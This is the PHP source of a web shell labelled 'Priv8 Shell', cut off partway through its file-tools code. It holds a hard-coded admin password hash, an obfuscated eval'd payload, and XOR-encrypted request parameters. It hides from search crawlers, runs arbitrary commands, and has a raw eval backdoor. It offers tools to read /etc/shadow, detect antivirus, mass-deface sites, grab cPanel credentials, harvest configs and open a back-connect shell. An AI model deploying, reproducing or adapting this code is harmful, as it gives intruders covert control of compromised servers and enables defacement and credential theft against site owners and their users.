<?php

$▛ = "21232f297a57a5a743894a0e4a801fc3";  // admin

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$▘ = true;
$▜ = 'utf-8';
$▚ = 'FilesMan';
$▙ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
        prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
}

if(empty($_POST['charset']))
        $_POST['charset'] = $▜;
if (!isset($_POST['ne'])) {
        if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
        if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
        if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
        if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
        if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}

eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));

function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')){
    set_magic_quotes_runtime(0);
}
@define('VERSION', 'Priv8 Shell');

/* (С) 11.2011 oRb */
if(!empty($▛)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
        prototype(md5($_SERVER['HTTP_HOST']), $▛);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
function hardLogin() {
                if(!empty($_SERVER['HTTP_USER_AGENT'])) {
                  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
                  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
                  header('HTTP/1.0 404 Not Found');
                  exit;
                  }
                }
        die("</br></br></br>

        <style>
        body {background-color:#000000; color:#e1e1e1; margin:0; font:normal 75% Open Sans, sans-serif; background-image:url('https://i.imgur.com/hLcQCBx.gif'); } </style><body><pre align=center><form method=post style='color:#ffffff;text-align: center;'><img src='https://i.imgur.com/4Fq8k1E.png' align='center'><br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer; '></form></pre> </body>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
        $os = 'win';
else
        $os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
        @chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
        $home_cwd = str_replace("\\", "/", $home_cwd);
        $cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
        $cwd .= '/';

function hardHeader() {
        if(empty($_POST['charset']))
                $_POST['charset'] = $GLOBALS['▜'];
        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title> " . VERSION ."</title>
        <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
<style>
        body {background-color:#000000; color:#e1e1e1; margin:0; font:normal 75% Open Sans, sans-serif; background-image:url('https://i.imgur.com/hLcQCBx.gif'); } 

        canvas{ display: block; vertical-align: bottom;}
        #particles-js{width: 100%; height: 100px; background-color: #000000; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
        body,td,th      {font:10pt Open Sans, sans-serif;margin:0;vertical-align:top;}
        table.infoo     {color:#ffffff; background-image: url('https://i.imgur.com/gL0UG8Y.png'); background-position: center;  background-repeat:no-repeat;  -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover;  background-size: 80%; }
        table.info      {color:#ffffff;}
        table#toolsTbl {background-color: #000000; background-image:url('https://i.imgur.com/hLcQCBx.gif'); }
        span,h1,a       {color:#ff1111 !important;}
        span            {font-weight:bolder;}
        h1                      {border-left:5px solid #ff1111;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px; }
        div.content     {padding:5px;margin-left:5px;background-color:#000000; background-image:url('https://i.imgur.com/hLcQCBx.gif');}
        a                       {text-decoration:none;}
        a:hover         {text-decoration:underline;}
        .tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
        .tooltip:hover::after {opacity:1;visibility:visible;}
        .ml1            {border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
        .bigarea        {min-width:100%;max-width:100%;height:400px;}
        input, textarea, select {margin:0;color:#fff;background-color:#202832;border:none;font:9pt Open Sans, sans-serif;outline:none; }
        label {position:relative}
        label:after {content:'<>';font:10px 'Open Sans', sans-serif, monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
        label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
        form            {margin:0px;}
        #toolsTbl       {text-align:center;}
        #fak            {background:none;}
        #fak td         {padding:5px 0 0 0;}
        iframe          {border:1px solid #000000;}
        .toolsInp       {width:300px}
        .main th        {text-align:left;background-color:#000000;}
        .main tr:hover{background-color:#373c42;}
        .main td, th{vertical-align:middle;}
        input[type='submit']{background-color:#ff1111;}
        input[type='button']{background-color:#ff1111;}
        input[type='submit']:hover{background-color:#ff1111;}
        input[type='button']:hover{background-color:#ff1111;}
        .l1                     {background-color:#202832;}
        pre                     {font:9pt 'Open Sans', sans-serif;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
        function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
        function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
        function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
        function set(a,c,p1,p2,p3,charset) {
                if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
                if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
                if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
                if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
                if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
                d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
                d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
                d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
                d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
                d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
                if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
        }
        function g(a,c,p1,p2,p3,charset) {
                set(a,c,p1,p2,p3,charset);
                d.mf.submit();
        }
        function a(a,c,p1,p2,p3,charset) {
                set(a,c,p1,p2,p3,charset);
                var params = 'ajax=true';
                for(i=0;i<d.mf.elements.length;i++)
                        params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
                sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
        }
        function sr(url, params) {
                if (window.XMLHttpRequest)
                        req = new XMLHttpRequest();
                else if (window.ActiveXObject)
                        req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
        }
        function processReqChange() {
                if( (req.readyState == 4) )
                        if(req.status == 200) {
                                var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
                                var arr=reg.exec(req.responseText);
                                eval(arr[2].substr(0, arr[1]));
                        } else alert('Request error!');
        }
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
        $freeSpace = @diskfreespace($GLOBALS['cwd']);
        $totalSpace = @disk_total_space($GLOBALS['cwd']);
        $totalSpace = $totalSpace?$totalSpace:1;
        $release = @php_uname('r');
        $kernel = @php_uname('s');
        $explink = 'https://www.exploit-db.com/search/?action=search&description=';
        if(strpos('Linux', $kernel) !== false)
                $explink .= urlencode('Linux Kernel ' . substr($release,0,6));
        else
                $explink .= urlencode($kernel . ' ' . substr($release,0,3));
        if(!function_exists('posix_getegid')) {
                $user = @get_current_user();
                $uid = @getmyuid();
                $gid = @getmygid();
                $group = "?";
        } else {
                $uid = @posix_getpwuid(@posix_geteuid());
                $gid = @posix_getgrgid(@posix_getegid());
                $user = $uid['name'];
                $uid = $uid['uid'];
                $group = $gid['name'];
                $gid = $gid['gid'];
        }
        $cwd_links = '';
        $path = explode("/", $GLOBALS['cwd']);
        $n=count($path);
        for($i=0; $i<$n-1; $i++) {
                $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
                for($j=0; $j<=$i; $j++)
                        $cwd_links .= $path[$j].'/';
                $cwd_links .= "\")'>".$path[$i]."/</a>";
        }
        $charsets = array('Windows-1251', 'UTF-8', 'KOI8-R', 'KOI8-U', 'cp866');
        $opt_charsets = '';
        foreach($charsets as $▟)
                $opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
        $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Mass Deface'=>'Sql','Adminer'=>'Adminer','Terminal'=>'Console','Mass User'=>'Edituser','Grab Cpanel'=>'Php','Get Configs'=>'SafeMode','Symlink'=>'Sym','Jumping'=>'StringTools','Cgi Telnet'=>'Bruteforce','Bypass'=>'bypas','BC'=>'Network');
        if(!empty($GLOBALS['▛']))
        if (isset($_REQUEST['xd'])) {
                $m['Reseller'] = 'Reseller'; }
        $m['Logout'] = 'Logout';
        $m['Self Remove'] = 'SelfRemove';
        $menu = '';
        foreach($m as $k => $v)
                $menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
        $drives = "";
        if ($GLOBALS['os'] == 'win') {
                foreach(range('c','z') as $drive)
                if (is_dir($drive.':\\'))
                        $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
        }
        /* (С) 08.2015 dmkcv */
        echo '<table class=infoo cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
                 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="https://anon.click/protected/https://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#ffffff><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
                 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
                 '<table style="background-color:#373c42;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
        $is_writable = is_writable($GLOBALS['cwd'])?" <font color='#ffffff'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
        <tr>
                <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
                <td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
        </tr><tr>
                <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
                <td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
        </tr><tr>
                <td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
                <td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
                <input type=hidden name=a value='FilesMan'>
                <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
                <input type=hidden name=p1 value='uploadFile'>
                <input type=hidden name=ne value=''>
                <input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
                <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
        </tr></table></div>


        </body></html>";
}
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
function ex($in) {
        $▖ = '';
        if (function_exists('exec')) {
                @exec($in,$▖);
                $▖ = @join("\n",$▖);
        } elseif (function_exists('passthru')) {
                ob_start();
                @passthru($in);
                $▖ = ob_get_clean();
        } elseif (function_exists('system')) {
                ob_start();
                @system($in);
                $▖ = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
                $▖ = shell_exec($in);
        } elseif (is_resource($f = @popen($in,"r"))) {
                $▖ = "";
                while(!@feof($f))
                        $▖ .= fread($f,1024);
                pclose($f);
        }else return "↳ Unable to execute command\n";
        return ($▖==''?"↳ Query did not return anything\n":$▖);
}
function viewSize($s) {
        if($s >= 1073741824)
                return sprintf('%1.2f', $s / 1073741824 ). ' GB';
        elseif($s >= 1048576)
                return sprintf('%1.2f', $s / 1048576 ) . ' MB';
        elseif($s >= 1024)
                return sprintf('%1.2f', $s / 1024 ) . ' KB';
        else
                return $s . ' B';
}
function perms($p) {
        if (($p & 0xC000) == 0xC000)$i = 's';
        elseif (($p & 0xA000) == 0xA000)$i = 'l';
        elseif (($p & 0x8000) == 0x8000)$i = '-';
        elseif (($p & 0x6000) == 0x6000)$i = 'b';
        elseif (($p & 0x4000) == 0x4000)$i = 'd';
        elseif (($p & 0x2000) == 0x2000)$i = 'c';
        elseif (($p & 0x1000) == 0x1000)$i = 'p';
        else $i = 'u';
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
        return $i;
}
function viewPermsColor($f) {
        if (!@is_readable($f))
                return '<font color=#ff1111><b>'.perms(@fileperms($f)).'</b></font>';
        elseif (!@is_writable($f))
                return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
        else
                return '<font color=#ffffff><b>'.perms(@fileperms($f)).'</b></font>';
}
function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function which($p) {
        $path = ex('which ' . $p);
        if(!empty($path))
                return $path;
        return false;
}


function actionRC() {
        if(!@$_POST['p1']) {
                $a = array(
                        "uname" => php_uname(),
                        "php_version" => phpversion(),
                        "VERSION" => VERSION,
                        "safemode" => @ini_get('safe_mode')
                );
                echo serialize($a);
        } else {
                eval($_POST['p1']);
        }
}
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionSecInfo() {
        hardHeader();
        echo '<h1>Server security information</h1><div class=content>';
        function showSecParam($n, $v) {
                $v = trim($v);
                if($v) {
                        echo '<span>' . $n . ': </span>';
                        if(strpos($v, "\n") === false)
                                echo $v . '<br>';
                        else
                                echo '<pre class=ml1>' . $v . '</pre>';
                }
        }
        showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
        showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
        showSecParam('Open base dir', @ini_get('open_basedir'));
        showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
        showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
        showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
        $temp=array();
        if(function_exists('mysql_get_client_info'))
                $temp[] = "MySql (".mysql_get_client_info().")";
        if(function_exists('mssql_connect'))
                $temp[] = "MSSQL";
        if(function_exists('pg_connect'))
                $temp[] = "PostgreSQL";
        if(function_exists('oci_connect'))
                $temp[] = "Oracle";
        showSecParam('Supported databases', implode(', ', $temp));
        echo '<br>';
        if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
                                showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
        } else {
                showSecParam('OS Version',ex('ver'));
                showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
                showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
        }
        echo '</div>';
        hardFooter();
}
function actionFilesTools() {
        if( isset($_POST['p1']) )
                $_POST['p1'] = urldecode($_POST['p1']);
        if(@$_POST['p2']=='download') {
                if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
                        ob_start("ob_gzhandler", 4096);
                        header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
                        if (function_exists("mime_content_type")) {
                                $type = @mime_content_type($_POST['p1']);
                                header("Content-Type: " . $type);
                        } else
                header("Content-Type: application/octet-stream");
                        $fp = @fopen($_POST['p1'], "r");
                        if($fp) {
                                while(!@feof($fp))
                                        echo @fread($fp, 1024);
                                fclose($fp);
                        }
                }exit;
        }
        if( @$_POST['p2'] == 'mkfile' ) {
                if(!file_exists($_POST['p1'])) {
                        $fp = @fopen($_POST['p1'], 'w');
                        if($fp) {
                                $_POST['p2'] = "edit";
                                fclose($fp);
                        }
                }
        }
        hardHeader();
        echo '<h1>File tools</h1><div class=content>';
        if( !file_exists(@$_POST['p1']) ) {
                echo 'File not exists';
                hardFooter();
                return;
        }
        $uid = @posix_getpwuid(@fileowner($_POST['p1']));
        if(!$uid) {
                $uid['name'] = @fileowner($_POST['p1']);
                $gid['name'] = @filegroup($_POST['p1']);
        } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
        echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
        echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
        if( empty($_POST['p2']) )
                $_POST['p2'] = 'view';
        if( is_file($_POST['p1']) )
                $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
        else
                $m = array('Chmod', 'Rename', 'Touch');
        foreach($m as $v)
                echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
        echo '<br><br>';
        switch($_POST['p2']) {
                case 'view':
                        echo '<pre class=ml1>';
                        $fp = @fopen($_POST['p1'], 'r');
                        if($fp) {
                                while( !@feof($fp) )
                                        echo htmlspecialchars(@fread($fp, 1024));
                                @fclose($fp);
                        }
                        echo '</pre>';
                        break;
                case 'highlight':
                        if( @is_readable($_POST['p1']) ) {
                                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
                                $oRb = @highlight_file($_POST['p1'],true);
                                echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
                        }
                        break;
                case 'chmod':
                        if( !empty($_POST['p3']) ) {
                                $perms = 0;
                                for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
                                        $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
                                if(!@chmod($_POST['p1'], $perms))
                                        echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
                        }
                        clearstatcache();
                        echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>';
                        break;
                case 'edit':
                        if( !is_writable($_POST['p1'])) {
                                echo 'File isn\'t writeable';
                                break;
                        }
                        if( !empty($_POST['p3']) ) {
                                $time = @filemtime($_POST['p1']);
                                $_POST['p3'] = substr($_POST['p3'],1);
                                $fp = @fopen($_POST['p1'],"w");
                                if($fp) {
                                        @fwrite($fp,$_POST['p3']);
                                        @fclose($fp);
                                        echo 'Saved!<br><script>p3_="";</script>';
                                        @touch($_POST['p1'],$time,$time);
                                }
                        }
                        echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
                        $fp = @fopen($_POST['p1'], 'r');
                        if($fp) {
                                while( !@feof($fp) )
                                        echo htmlspecialchars(@fread($fp, 1024));
                                @fclose($fp);
                        }
                        echo '</textarea><input type=submit value="submit"></form>';
                        break;
                case 'hexdump':
                        $c = @file_get_contents($_POST['p1']);
                        $n = 0;
                        $h = array('00000000<br>','','');
                        $len = strlen($c);
                        for ($i=0; $i<$len; ++$i) {
                                $h[1] .= sprintf('%02X',ord($c[$i])).' ';
                                switch ( ord($c[$i]) ) {
                                        case 0:  $h[2] .= ' '; break;
                                        case 9:  $h[2] .= ' '; break;
                                        case 10: $h[2] .= ' '; break;
                                        case 13: $h[2] .= ' '; break;
                                        default: $h[2] .= $c[$i]; break;
                                }
                                $n++;
                                if ($n == 32) {
                                        $n = 0;
